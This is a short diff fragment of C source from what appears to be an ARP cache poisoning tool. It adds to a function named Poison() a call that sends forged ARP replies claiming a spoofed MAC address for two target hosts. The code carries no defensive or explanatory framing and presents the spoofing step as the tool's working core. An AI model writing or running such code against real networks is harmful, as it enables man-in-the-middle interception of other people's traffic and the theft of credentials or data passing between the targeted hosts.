@@ -26,6 +26,18 @@ void Poison(void)
 
     printf("poisoning now.\n");
 
+    ArpSend
+    (
+        soc, //soc
+        ARPOP_REPLY, //op
+        Param.vmac,//e_smac
+        dmac,      //e_dmac
+        Param.vmac,//smac
+        dmac,//dmac
+        saddr.c,   //saddr
+        daddr.c
+    );  //daddr
+
 }
 
 void StartPoison(int soc, struct in_addr *tar1, struct in_addr *tar2)
